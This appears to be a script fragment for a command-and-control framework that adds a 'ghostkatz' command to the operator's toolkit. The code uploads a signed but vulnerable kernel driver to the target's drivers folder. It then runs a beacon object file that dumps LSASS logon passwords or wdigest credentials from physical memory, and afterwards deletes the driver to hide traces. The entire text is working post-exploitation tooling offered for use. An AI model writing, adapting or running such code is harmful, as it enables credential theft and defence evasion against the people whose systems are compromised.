///YOUR CREDS.AXS - ADD THIS BLOCK ///
var cmd_ghostkatz = ax.create_command(
    "ghostkatz",
    "Dump credentials from LSASS via signed kernel driver (physical memory read)",
    "ghostkatz logonpasswords -prv 1"
);
cmd_ghostkatz.addArgString("mode", true, "Dump mode: logonpasswords or wdigest");
cmd_ghostkatz.addArgFlagInt("-prv", "provider", "Driver provider: 1=tpwsav.sys, 2=throttlestop.sys", 1);

cmd_ghostkatz.setPreHook(function (id, cmdline, parsed_json, ...parsed_lines) {
    if (ax.is64(id) === false) {
        throw new Error("ghostkatz BOF is x64 only");
    }

    let mode         = parsed_json["mode"];
    let provider_num = parsed_json["provider"];
    if (provider_num === undefined || provider_num === null) provider_num = 1;

    if (mode !== "logonpasswords" && mode !== "wdigest") {
        ax.console_message(id, "Error: mode must be 'logonpasswords' or 'wdigest'", "error");
        return;
    }
    if (provider_num !== 1 && provider_num !== 2) {
        ax.console_message(id, "Error: provider must be 1 (tpwsav.sys) or 2 (throttlestop.sys)", "error");
        return;
    }

    let drv_src  = (provider_num === 1) ? "tpwsav.sys" : "throttlestop.sys";
    let drv_dest = "C:/Windows/System32/drivers/" + drv_src;

    let bof_params = ax.bof_pack("cstr,int,cstr", ["-prv", provider_num, mode]);
    let bof_path   = ax.script_dir() + "_bin/ghostkatz.x64.o";

    // Detect agent type to branch upload/cleanup syntax
    let agent = ax.agents()[id];
    let is_kharon = (agent["type"] === "kharon");

    // 1) Upload driver — unquoted paths, forward slashes
    ax.execute_alias(
        id, cmdline,
        `upload ${ax.script_dir()}drivers/${drv_src} ${drv_dest}`,
        "ghostkatz: upload driver"
    );

    // 2) Run BOF
    ax.execute_alias(
        id, "",
        `execute bof ${bof_path} ${bof_params}`,
        "ghostkatz: dumping via kernel driver"
    );

    // 3) Cleanup — fs rm on kharon, rm on beacon
    let rm_cmd = is_kharon ? `fs rm ${drv_dest}` : `rm ${drv_dest}`;
    ax.execute_alias(
        id, "",
        rm_cmd,
        "ghostkatz: cleanup driver"
    );
});


/// REGISTER YOUR COMMAND:

var group_test = ax.create_commands_group("Creds-BOF", [
    YOUR COMMAND GROUPS, cmd_ghostkatz
]);
